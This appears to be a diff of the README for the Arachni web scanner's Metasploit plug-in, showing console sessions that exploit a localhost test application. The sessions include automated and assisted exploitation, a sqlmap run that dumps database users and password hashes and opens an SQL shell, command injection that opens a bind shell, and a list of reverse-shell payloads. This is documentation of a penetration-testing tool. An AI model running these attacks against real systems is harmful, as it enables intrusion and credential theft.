@@ -59,40 +59,33 @@ To convert a standard Arachni Framework Report (.afr) file to a Metareport (.afr
 
 
 ### Using the Arachni plug-in via Metasploit
-#### Automated exploitation (arachni_autopwn)
 
-##### Usage
-    msf > arachni_autopwn
-    [*] Usage: arachni_autopwn [options]
-            -h          Display this help text
-            -x [regexp] Only run modules whose name matches the regex
-            -a          Launch exploits against all matched targets
-            -r          Use a reverse connect shell
-            -b          Use a bind shell on a random port (default)
-            -m          Use a meterpreter shell (if possible)
-            -q          Disable exploit module output
+#### Loading the ArachniMetareport
+    $ ./msfconsole  # Start the MSF
 
-##### Example
-    $ ./msfconsole
-
-    #    # ###### #####   ##    ####  #####  #       ####  # #####
-    ##  ## #        #    #  #  #      #    # #      #    # #   #
-    # ## # #####    #   #    #  ####  #    # #      #    # #   #
-    #    # #        #   ######      # #####  #      #    # #   #
-    #    # #        #   #    # #    # #      #      #    # #   #
-    #    # ######   #   #    #  ####  #      ######  ####  #   #
+                         888                           888        d8b888
+                         888                           888        Y8P888
+                         888                           888           888
+    88888b.d88b.  .d88b. 888888 8888b. .d8888b 88888b. 888 .d88b. 888888888
+    888 "888 "88bd8P  Y8b888       "88b88K     888 "88b888d88""88b888888
+    888  888  88888888888888   .d888888"Y8888b.888  888888888  888888888
+    888  888  888Y8b.    Y88b. 888  888     X88888 d88P888Y88..88P888Y88b.
+    888  888  888 "Y8888  "Y888"Y888888 88888P'88888P" 888 "Y88P" 888 "Y888
+                                               888
+                                               888
+                                               888
 
 
            =[ metasploit v3.5.1-dev [core:3.5 api:1.0]
-    + -- --=[ 619 exploits - 306 auxiliary
+    + -- --=[ 620 exploits - 307 auxiliary
     + -- --=[ 215 payloads - 27 encoders - 8 nops
-           =[ svn r10832 updated yesterday (2010.10.26)
+           =[ svn r10844 updated today (2010.10.29)
 
-    msf > load arachni
+    msf > load arachni      # Load the Arachni plug-in
     [*] Successfully loaded plugin: arachni
-    msf > arachni_load ../arachni/localhost.afr.msf
+    msf > arachni_load ../arachni/localhost.afr.msf     # Load the ArachniMetareport using the Arachni plug-in
     [*] Loading report...
-    [*] Loaded 17 vulnerabilities.
+    [*] Loaded 19 vulnerabilities.
 
 
     Unique exploits
@@ -110,7 +103,17 @@ To convert a standard Arachni Framework Report (.afr) file to a Metareport (.afr
                                     Supported vectors: GET, POST, COOKIE, HEADER.
                                     (Mainly for use with the Arachni plug-in.)
 
-        2   unix/webapp/arachni_php_eval
+        2   unix/webapp/arachni_exec
+                                            This module allows complex HTTP requests to be crafted in order to
+                                    allow exploitation of command injection vulnerabilities in Unix-like platforms.
+
+                                    Use 'XXinjectionXX' to mark the value of the vulnerable variable/field,
+                                    i.e. where the payload should go.
+
+                                    Supported vectors: GET, POST, COOKIE, HEADER.
+                                    (Mainly for use with the Arachni plug-in.)
+
+        3   unix/webapp/arachni_php_eval
                                             This module allows complex HTTP requests to be crafted in order to
                                     allow exploitation of PHP eval() vulnerabilities in Unix-like platforms.
 
@@ -120,15 +123,24 @@ To convert a standard Arachni Framework Report (.afr) file to a Metareport (.afr
                                     Supported vectors: GET, POST, COOKIE, HEADER.
                                     (Mainly for use with the Arachni plug-in.)
 
-        3   unix/webapp/arachni_exec
-                                            This module allows complex HTTP requests to be crafted in order to
-                                    allow exploitation of command injection vulnerabilities in Unix-like platforms.
+        4   unix/webapp/arachni_sqlmap
 
-                                    Use 'XXinjectionXX' to mark the value of the vulnerable variable/field,
-                                    i.e. where the payload should go.
+                                    This module is designed to be used with the Arachni plug-in.
 
-                                    Supported vectors: GET, POST, COOKIE, HEADER.
-                                    (Mainly for use with the Arachni plug-in.)
+                                    From the original:
+
+                                            This module launches an sqlmap session.
+                                    sqlmap is an automatic SQL injection tool developed in Python.
+                                    Its goal is to detect and take advantage of SQL injection
+                                    vulnerabilities on web applications. Once it detects one
+                                    or more SQL injections on the target host, the user can
+                                    choose among a variety of options to perform an extensive
+                                    back-end database management system fingerprint, retrieve
+                                    DBMS session user and database, enumerate users, password
+                                    hashes, privileges, databases, dump entire or user
+                                    specific DBMS tables/columns, run his own SQL SELECT
+                                    statement, read specific files on the file system and much
+                                    more.
 
 
 
@@ -140,23 +152,43 @@ To convert a standard Arachni Framework Report (.afr) file to a Metareport (.afr
         --  ----       ----                                    ----                   ------  ------                               -------
         1   127.0.0.1  /~zapotek/tests/trainer.php             Remote file inclusion  COOKIE  {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
         2   127.0.0.1  /~zapotek/tests/trainer.php             Remote file inclusion  COOKIE  {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
-        3   127.0.0.1  /~zapotek/tests/forms/eval.php          Code injection         POST    {"eval"=>";XXinjectionXX"}           unix/webapp/arachni_php_eval
-        4   127.0.0.1  /~zapotek/tests/forms/os_command.php    OS command injection   POST    {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
-        5   127.0.0.1  /~zapotek/tests/forms/os_command.php    OS command injection   POST    {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
-        6   127.0.0.1  /~zapotek/tests/forms/rfi.php           Remote file inclusion  POST    {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
-        7   127.0.0.1  /~zapotek/tests/forms/rfi.php           Remote file inclusion  POST    {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
-        8   127.0.0.1  /~zapotek/tests/links/eval.php          Code injection         GET     {"eval"=>";XXinjectionXX"}           unix/webapp/arachni_php_eval
-        9   127.0.0.1  /~zapotek/tests/links/os_command.php    OS command injection   GET     {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
-        10  127.0.0.1  /~zapotek/tests/links/os_command.php    OS command injection   GET     {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
-        11  127.0.0.1  /~zapotek/tests/links/rfi.php           Remote file inclusion  GET     {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
-        12  127.0.0.1  /~zapotek/tests/links/rfi.php           Remote file inclusion  GET     {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
-        13  127.0.0.1  /~zapotek/tests/cookies/eval.php        Code injection         COOKIE  {"eval"=>"%3BXXinjectionXX"}         unix/webapp/arachni_php_eval
-        14  127.0.0.1  /~zapotek/tests/cookies/os_command.php  OS command injection   COOKIE  {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
-        15  127.0.0.1  /~zapotek/tests/cookies/os_command.php  OS command injection   COOKIE  {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
-        16  127.0.0.1  /~zapotek/tests/cookies/rfi.php         Remote file inclusion  COOKIE  {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
-        17  127.0.0.1  /~zapotek/tests/cookies/rfi.php         Remote file inclusion  COOKIE  {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
+        3   127.0.0.1  /~zapotek/tests/cookies/os_command.php  OS command injection   COOKIE  {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
+        4   127.0.0.1  /~zapotek/tests/cookies/os_command.php  OS command injection   COOKIE  {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
+        5   127.0.0.1  /~zapotek/tests/cookies/rfi.php         Remote file inclusion  COOKIE  {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
+        6   127.0.0.1  /~zapotek/tests/cookies/rfi.php         Remote file inclusion  COOKIE  {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
+        7   127.0.0.1  /~zapotek/tests/cookies/eval.php        Code injection         COOKIE  {"eval"=>"%3BXXinjectionXX"}         unix/webapp/arachni_php_eval
+        8   127.0.0.1  /~zapotek/tests/forms/eval.php          Code injection         POST    {"eval"=>";XXinjectionXX"}           unix/webapp/arachni_php_eval
+        9   127.0.0.1  /~zapotek/tests/forms/os_command.php    OS command injection   POST    {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
+        10  127.0.0.1  /~zapotek/tests/forms/os_command.php    OS command injection   POST    {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
+        11  127.0.0.1  /~zapotek/tests/forms/rfi.php           Remote file inclusion  POST    {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
+        12  127.0.0.1  /~zapotek/tests/forms/rfi.php           Remote file inclusion  POST    {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
+        13  127.0.0.1  /~zapotek/tests/forms/sqli.php          SQL Injection          POST    {"sql_inj"=>"1"}                     unix/webapp/arachni_sqlmap
+        14  127.0.0.1  /~zapotek/tests/links/os_command.php    OS command injection   GET     {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
+        15  127.0.0.1  /~zapotek/tests/links/os_command.php    OS command injection   GET     {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
+        16  127.0.0.1  /~zapotek/tests/links/rfi.php           Remote file inclusion  GET     {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
+        17  127.0.0.1  /~zapotek/tests/links/rfi.php           Remote file inclusion  GET     {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
+        18  127.0.0.1  /~zapotek/tests/links/eval.php          Code injection         GET     {"eval"=>";XXinjectionXX"}           unix/webapp/arachni_php_eval
+        19  127.0.0.1  /~zapotek/tests/links/sqli.php          Blind SQL Injection    GET     {"id"=>"1"}                          unix/webapp/arachni_sqlmap
+
+
 
     [*] Done!
+    msf >
+
+#### Automated exploitation (arachni_autopwn)
+
+##### Usage
+    msf > arachni_autopwn
+    [*] Usage: arachni_autopwn [options]
+            -h          Display this help text
+            -x [regexp] Only run modules whose name matches the regex
+            -a          Launch exploits against all matched targets
+            -r          Use a reverse connect shell
+            -b          Use a bind shell on a random port (default)
+            -m          Use a meterpreter shell (if possible)
+            -q          Disable exploit module output
+
+##### Example
     msf > arachni_autopwn -a
     [*] Running pwn-jobs...
     [...snip...]
@@ -223,66 +255,13 @@ To convert a standard Arachni Framework Report (.afr) file to a Metareport (.afr
     [*] Command shell session 1 closed.  Reason: User exit
     msf >
 
+Notice that we ended up with 16 sessions out of the 19 reported vulnerabilities. <br/>
+This is due to the fact that the "unix/webapp/arachni_sqlmap" exploit can't be launched automatically and because some of the reported vulnerabilities are basically the same.
+
+Next we'll see how to use the "arachni_manual" command for assisted exploitation and get an SQL shell.
+
 ### Assisted exploitation (arachni_manual)
-    $ ./msfconsole
-
-    #    # ###### #####   ##    ####  #####  #       ####  # #####
-    ##  ## #        #    #  #  #      #    # #      #    # #   #
-    # ## # #####    #   #    #  ####  #    # #      #    # #   #
-    #    # #        #   ######      # #####  #      #    # #   #
-    #    # #        #   #    # #    # #      #      #    # #   #
-    #    # ######   #   #    #  ####  #      ######  ####  #   #
-
-
-           =[ metasploit v3.5.1-dev [core:3.5 api:1.0]
-    + -- --=[ 619 exploits - 306 auxiliary
-    + -- --=[ 215 payloads - 27 encoders - 8 nops
-           =[ svn r10832 updated yesterday (2010.10.26)
-
-    msf > load arachni
-    [*] Successfully loaded plugin: arachni
-    msf > arachni_load ../arachni/localhost.afr.msf
-    [*] Loading report...
-    [*] Loaded 17 vulnerabilities.
-
-
-    Unique exploits
-    ===============
-
-        ID  Exploit                          Description
-        --  -------                          -----------
-        1   unix/webapp/arachni_php_include
-                                            This module allows complex HTTP requests to be crafted in order to
-                                    allow exploitation of PHP remote file inclusion vulnerabilities.
-
-                                    Use 'XXinjectionXX' to mark the value of the vulnerable variable/field,
-                                    i.e. where the payload should go.
-
-                                    Supported vectors: GET, POST, COOKIE, HEADER.
-                                    (Mainly for use with the Arachni plug-in.)
-
-        2   unix/webapp/arachni_php_eval
-                                            This module allows complex HTTP requests to be crafted in order to
-                                    allow exploitation of PHP eval() vulnerabilities in Unix-like platforms.
-
-                                    Use 'XXinjectionXX' to mark the value of the vulnerable variable/field,
-                                    i.e. where the payload should go.
-
-                                    Supported vectors: GET, POST, COOKIE, HEADER.
-                                    (Mainly for use with the Arachni plug-in.)
-
-        3   unix/webapp/arachni_exec
-                                            This module allows complex HTTP requests to be crafted in order to
-                                    allow exploitation of command injection vulnerabilities in Unix-like platforms.
-
-                                    Use 'XXinjectionXX' to mark the value of the vulnerable variable/field,
-                                    i.e. where the payload should go.
-
-                                    Supported vectors: GET, POST, COOKIE, HEADER.
-                                    (Mainly for use with the Arachni plug-in.)
-
-
-
+    msf > arachni_list_vulns    # Let's take a look at the available vulnerabilities once again.
 
     Vulnerabilities
     ===============
@@ -291,83 +270,151 @@ To convert a standard Arachni Framework Report (.afr) file to a Metareport (.afr
         --  ----       ----                                    ----                   ------  ------                               -------
         1   127.0.0.1  /~zapotek/tests/trainer.php             Remote file inclusion  COOKIE  {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
         2   127.0.0.1  /~zapotek/tests/trainer.php             Remote file inclusion  COOKIE  {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
-        3   127.0.0.1  /~zapotek/tests/forms/eval.php          Code injection         POST    {"eval"=>";XXinjectionXX"}           unix/webapp/arachni_php_eval
-        4   127.0.0.1  /~zapotek/tests/forms/os_command.php    OS command injection   POST    {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
-        5   127.0.0.1  /~zapotek/tests/forms/os_command.php    OS command injection   POST    {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
-        6   127.0.0.1  /~zapotek/tests/forms/rfi.php           Remote file inclusion  POST    {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
-        7   127.0.0.1  /~zapotek/tests/forms/rfi.php           Remote file inclusion  POST    {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
-        8   127.0.0.1  /~zapotek/tests/links/eval.php          Code injection         GET     {"eval"=>";XXinjectionXX"}           unix/webapp/arachni_php_eval
-        9   127.0.0.1  /~zapotek/tests/links/os_command.php    OS command injection   GET     {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
-        10  127.0.0.1  /~zapotek/tests/links/os_command.php    OS command injection   GET     {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
-        11  127.0.0.1  /~zapotek/tests/links/rfi.php           Remote file inclusion  GET     {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
-        12  127.0.0.1  /~zapotek/tests/links/rfi.php           Remote file inclusion  GET     {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
-        13  127.0.0.1  /~zapotek/tests/cookies/eval.php        Code injection         COOKIE  {"eval"=>"%3BXXinjectionXX"}         unix/webapp/arachni_php_eval
-        14  127.0.0.1  /~zapotek/tests/cookies/os_command.php  OS command injection   COOKIE  {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
-        15  127.0.0.1  /~zapotek/tests/cookies/os_command.php  OS command injection   COOKIE  {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
-        16  127.0.0.1  /~zapotek/tests/cookies/rfi.php         Remote file inclusion  COOKIE  {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
-        17  127.0.0.1  /~zapotek/tests/cookies/rfi.php         Remote file inclusion  COOKIE  {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
+        3   127.0.0.1  /~zapotek/tests/cookies/os_command.php  OS command injection   COOKIE  {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
+        4   127.0.0.1  /~zapotek/tests/cookies/os_command.php  OS command injection   COOKIE  {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
+        5   127.0.0.1  /~zapotek/tests/cookies/rfi.php         Remote file inclusion  COOKIE  {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
+        6   127.0.0.1  /~zapotek/tests/cookies/rfi.php         Remote file inclusion  COOKIE  {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
+        7   127.0.0.1  /~zapotek/tests/cookies/eval.php        Code injection         COOKIE  {"eval"=>"%3BXXinjectionXX"}         unix/webapp/arachni_php_eval
+        8   127.0.0.1  /~zapotek/tests/forms/eval.php          Code injection         POST    {"eval"=>";XXinjectionXX"}           unix/webapp/arachni_php_eval
+        9   127.0.0.1  /~zapotek/tests/forms/os_command.php    OS command injection   POST    {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
+        10  127.0.0.1  /~zapotek/tests/forms/os_command.php    OS command injection   POST    {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
+        11  127.0.0.1  /~zapotek/tests/forms/rfi.php           Remote file inclusion  POST    {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
+        12  127.0.0.1  /~zapotek/tests/forms/rfi.php           Remote file inclusion  POST    {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
+        13  127.0.0.1  /~zapotek/tests/forms/sqli.php          SQL Injection          POST    {"sql_inj"=>"1"}                     unix/webapp/arachni_sqlmap
+        14  127.0.0.1  /~zapotek/tests/links/os_command.php    OS command injection   GET     {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
+        15  127.0.0.1  /~zapotek/tests/links/os_command.php    OS command injection   GET     {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
+        16  127.0.0.1  /~zapotek/tests/links/rfi.php           Remote file inclusion  GET     {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
+        17  127.0.0.1  /~zapotek/tests/links/rfi.php           Remote file inclusion  GET     {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
+        18  127.0.0.1  /~zapotek/tests/links/eval.php          Code injection         GET     {"eval"=>";XXinjectionXX"}           unix/webapp/arachni_php_eval
+        19  127.0.0.1  /~zapotek/tests/links/sqli.php          Blind SQL Injection    GET     {"id"=>"1"}                          unix/webapp/arachni_sqlmap
 
-    [*] Done!
-    msf > arachni_manual 3
-    [*] Using unix/webapp/arachni_php_eval .
-    [*] Preparing datastore for 'Code injection' vulnerability @ 127.0.0.1/~zapotek/tests/forms/eval.php ...
+
+    msf > arachni_manual 19     # The vulnerability with ID '19' uses the 'unix/webapp/arachni_sqlmap' module
+    [*] Using unix/webapp/arachni_sqlmap .
+    [*] Preparing datastore for 'Blind SQL Injection' vulnerability @ 127.0.0.1/~zapotek/tests/links/sqli.php ...
     SRVHOST => 127.0.0.1
-    SRVPORT => 9681
+    SRVPORT => 7872
     RHOST => 127.0.0.1
     RPORT => 80
     LHOST => 127.0.0.1
-    LPORT => 13200
-    POST => eval=;XXinjectionXX
+    LPORT => 12633
+    SSL => false
+    GET => id=1
+    METHOD => GET
     COOKIES =>
     HEADERS => Accept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8::User-Agent=Arachni/0.2.1
-    PATH => /~zapotek/tests/forms/eval.php
-    PAYLOAD => php/bind_php
+    PATH => /~zapotek/tests/links/sqli.php
     [*] Done!
 
     Compatible payloads
     ===================
 
-        Name                         Description
-        ----                         -----------
-        generic/shell_bind_tcp       Listen for a connection and spawn a command shell
-        generic/shell_reverse_tcp    Connect back to attacker and spawn a command shell
-        php/bind_perl                Listen for a connection and spawn a command shell via perl (persistent)
-        php/bind_php                 Listen for a connection and spawn a command shell via php
-        php/download_exec            Download an EXE from an HTTP URL and execute it
-        php/exec                     Execute a single system command
-        php/meterpreter/bind_tcp     Listen for a connection, Run a meterpreter server in PHP
-        php/meterpreter/reverse_tcp  Reverse PHP connect back stager with checks for disabled functions, Run a meterpreter server in PHP
-        php/reverse_perl             Creates an interactive shell via perl
-        php/reverse_php              Reverse PHP connect back shell with checks for disabled functions
-        php/shell_findsock
-                                    Spawn a shell on the established connection to
-                                    the webserver.  Unfortunately, this payload
-                                    can leave conspicuous evil-looking entries in the
-                                    apache error logs, so it is probably a good idea
-                                    to use a bind or reverse shell unless firewalls
-                                    prevent them from working.  The issue this
-                                    payload takes advantage of (CLOEXEC flag not set
-                                    on sockets) appears to have been patched on the
-                                    Ubuntu version of Apache and may not work on
-                                    other Debian-based distributions.  Only tested on
-                                    Apache but it might work on other web servers
-                                    that leak file descriptors to child processes.
-
+        Name  Description
+        ----  -----------
 
 
     Use: set PAYLOAD <name>
-    msf exploit(arachni_php_eval) > exploit
+    msf auxiliary(arachni_sqlmap) > show options    # Make sure that everything is setup properly
 
-    [*] Sending HTTP request for /~zapotek/tests/forms/eval.php
+    Module options:
+
+       Name         Current Setting                                         Required  Description
+       ----         ---------------                                         --------  -----------
+       COOKIES                                                              no
+       GET          id=1                                                    no        HTTP GET query
+       METHOD       GET                                                     yes       HTTP Method
+       OPTS         --users --time-test --passwords --dbs --sql-shell -v 0  no        The sqlmap options to use
+       PATH         /~zapotek/tests/links/sqli.php                          yes       The path to test for SQL injection
+       POST                                                                 no        The data string to be sent through POST
+       Proxies                                                              no        Use a proxy chain
+       RHOST        127.0.0.1                                               yes       The target address
+       RPORT        80                                                      yes       The target port
+       SQLMAP_PATH  sqlmap                                                  yes       The sqlmap >= 0.8 full path
+       VHOST                                                                no        HTTP server virtual host
+
+    msf auxiliary(arachni_sqlmap) > set SQLMAP_PATH /home/zapotek/Downloads/sqlmap/sqlmap.py    # Tell the module where the sqlmap script is
+    SQLMAP_PATH => /home/zapotek/Downloads/sqlmap/sqlmap.py
+    msf auxiliary(arachni_sqlmap) > exploit     # rock it!
+
+    [*] exec: /home/zapotek/Downloads/sqlmap/sqlmap.py -u 'http://127.0.0.1:80//~zapotek/tests/links/sqli.php?id=1' --method GET --users --time-test --passwords --dbs --sql-shell -v 0 --cookie ''
+
+        sqlmap/0.8 - automatic SQL injection and database takeover tool
+        http://sqlmap.sourceforge.net
+
+    [*] starting at: 15:08:25
+
+    [15:08:26] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
+    web server operating system: Linux Ubuntu
+    web application technology: PHP 5.3.3, Apache 2.2.16
+    back-end DBMS: MySQL >= 5.0.0
+
+    time based blind sql injection payload:    'id=1%27%20AND%20SLEEP%285%29%20AND%20%27HXME%27=%27HXME'
+
+    database management system users [5]:
+    [*] 'debian-sys-maint'@'localhost'
+    [*] 'phpmyadmin'@'localhost'
+    [*] 'root'@'127.0.0.1'
+    [*] 'root'@'localhost'
+    [*] 'root'@'zonster'
+
+    database management system users password hashes:
+    [*] debian-sys-maint [1]:
+        password hash: *7AD474111CBF8492D9311D6E8493490ED6247D86
+    [*] phpmyadmin [1]:
+        password hash: *C3A70F18627A18967A3A70C0F648CDEE0BCE9AB2
+    [*] root [1]:
+        password hash: NULL
+
+    available databases [5]:
+    [*] arachni
+    [*] information_schema
+    [*] msf
+    [*] mysql
+    [*] phpmyadmin
+
+    sql-shell> CURRENT_USER()   # And we now have an SQL shell to play with!
+    do you want to retrieve the SQL statement output? [Y/n]
+    CURRENT_USER():    'root@localhost'
+    sql-shell> VERSION()
+    do you want to retrieve the SQL statement output? [Y/n]
+    VERSION():    '5.1.49-1ubuntu8'
+
+    sql-shell> q
+
+    [*] shutting down at: 15:09:07
+
+    [*] Auxiliary module execution completed
+    msf auxiliary(arachni_sqlmap) >
+
+Of course 'arachni_manual' is not limited to any one module.
+For example:
+    msf auxiliary(arachni_sqlmap) > arachni_manual 15   # Prepare the vulnerability with ID '15'
+    [*] Using unix/webapp/arachni_exec .
+    [*] Preparing datastore for 'OS command injection' vulnerability @ 127.0.0.1/~zapotek/tests/links/os_command.php ...
+    SRVHOST => 127.0.0.1
+    SRVPORT => 9033
+    RHOST => 127.0.0.1
+    RPORT => 80
+    LHOST => 127.0.0.1
+    LPORT => 11853
+    SSL => false
+    GET => os_command=XXinjectionXX
+    METHOD => GET
+    COOKIES =>
+    HEADERS => Accept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8::User-Agent=Arachni/0.2.1
+    PATH => /~zapotek/tests/links/os_command.php
+    [*] Done!
+    PAYLOAD => cmd/unix/bind_perl
+    msf exploit(arachni_exec) > exploit # rock it!
+
+    [*] Sending HTTP request for /~zapotek/tests/links/os_command.php
     [*] Started bind handler
-    [*] Command shell session 17 opened (127.0.0.1:40351 -> 127.0.0.1:13200) at 2010-10-28 18:53:12 +0100
+    [*] Command shell session 17 opened (127.0.0.1:45295 -> 127.0.0.1:11853) at 2010-10-29 15:13:48 +0100   # And we now have a system shell!
 
     ls
-    csrf.php
     eval.php
-    login.php
     os_command.php
-    recon
+    redirect.php
     rfi.php
     sqli.php
     xss.php
@@ -378,4 +425,5 @@ To convert a standard Arachni Framework Report (.afr) file to a Metareport (.afr
     Abort session 17? [y/N]  y
 
     [*] Command shell session 17 closed.  Reason: User exit
-    msf exploit(arachni_php_eval) >
+    msf exploit(arachni_exec) >
+
